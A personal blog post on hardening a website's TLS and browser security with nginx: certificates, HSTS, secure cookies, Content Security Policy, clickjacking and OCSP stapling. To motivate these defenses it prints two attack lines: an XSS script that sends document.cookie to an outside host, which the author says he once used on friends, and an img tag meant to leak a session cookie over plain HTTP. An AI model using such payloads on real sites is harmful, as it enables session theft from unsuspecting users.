{"title": "Deploy SSL or die"}

*Update: [Let's Encrypt](https://letsencrypt.org/) offers free of charge TLS certificates.*

Few excuses remain not to deploy SSL on your HTTP server. Especially if
your server receives sensitive data over the internet.

For a few dollars a year you can tell your customers you care about 
security. Tell them to look for the padlock.

I acquired an SSL certificate from [StartSSL](https://www.startssl.com/) and
installed it on this blog. StartSSL is the only trusted CA which offers free SSL
certificates. **It's only free for non-commercial usage.** I don't really 
need SSL here, but hey it's free and I want to learn how to setup nginx with SSL.

Here is a minimal config for nginx;

    server {
        listen       8081;
        server_name jekyll.local;
        root /home/dag/projects/my-awesome-site/_site;
        ssl                  on;
        ssl_certificate      /home/dag/vikan-tls/certs/ca-chain.cert.pem;
        ssl_certificate_key  /home/dag/vikan-tls/private/jekyll.key.pem;
    }

[konklone](https://konklone.com/post/switch-to-https-now-for-free)
has a nice step-by-step guide for getting a certificate and setting it up.
Read mozilla's [TLS wiki](https://wiki.mozilla.org/Security/Server_Side_TLS)
for recommended server configuration.

## Tame the browser

![](/blogimages/blackhole01.jpg)

The browser is like a giant black hole that sucks in all code it can get. And
executes it. It is a very nice platform for distributing viruses. It must me 
constrained and tamed. 

Do not only put login form over SSL. Eavesdroppers can sniff session
cookies. In the past, facebook put only login
form over SSL by default. A tool called [Firesheep](https://en.wikipedia.org/wiki/Firesheep)
exploited this. An active attacker can inject content into
non-SSL elements. A nasty example is changing form action url to non SSL.
Or javascript code which grabs the password on form submission.

Consider instructing browsers to disallow HTTP
requests. This can be done with the [HSTS](https://www.chromium.org/hsts/) header:

    # go to SSL version next time please
    add_header Strict-Transport-Security "max-age=15768000;";

The HSTS header tells your browser to not allow HTTP without SSL. Check out 
the [SSL stripping attack](http://www.thoughtcrime.org/software/sslstrip/)
for details. It is 
[deadly](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).
The HSTS header does not prevent SSL stripping if the browser is seeing the 
header for the first time.

Requests towards port 80 should toss back a redirect to https. 

If you are going to use cookies then set the secure flag to prevent them
from leaking from HTTPS over to HTTP. Older clients do not have HSTS.
This is for them.

Here is an example which leaks the session cookie on facebook.

    <img src="http://www.facebook.com/LEAK-COOKIES-PLEASE">

Turns out facebook has neither HSTS or secure cookies. They do default
to SSL though.


## XSS shall not pass!

Back in the day when I was stealing cookies from my friends I would 
instruct their browser to do this;

    <script>new Image().src='http://dvikan.no/?c='+document.cookie</script>

[Content Security Policy](https://developer.mozilla.org/en-US/docs/Security/CSP/Introducing_Content_Security_Policy)
can prevent these kinds of data extraction. It is not first line of defense 
but defense indepth. Here is an example that instructs browser to only 
allow image references to itself;

    Content-Security-Policy: img-src 'self'

It is pretty clever.

## Clickjacking pepperspray

Clickjacking is when you click an element and the click is highjacked. Actually
you clicked an iframe with a facebook like button for Justin Bieber's fan page.

There is an HTTP header for disallowing a website to be inside an iframe. 
This is how you do it:

    add_header X-Frame-Options DENY;

## OCSP Stapling

For faster TLS handshakes, piggyback the OCSP response onto server reply.
This does not reduce security because the OCSP response is signed anyway.

    resolver 8.8.8.8;
    ssl_stapling on;

## Forward secrecy

Keeps historic traffic data safe. A future compromise of the private key
will not enable decryption of traffic data.

## Dessert

SSL is old. It is from 1995. We should migrate over to the modern term TLS.

This TLS business is all fun and games until you realize that

> Cryptography is typically bypassed, not penetrated. -- Adi Shamir

Remember that users will pick `hunter2` as their password if they
are allowed.

Also remember that the visited domain name is plaintext for an eavesdropper.
It is sent in both the actual certificate and via SNI.

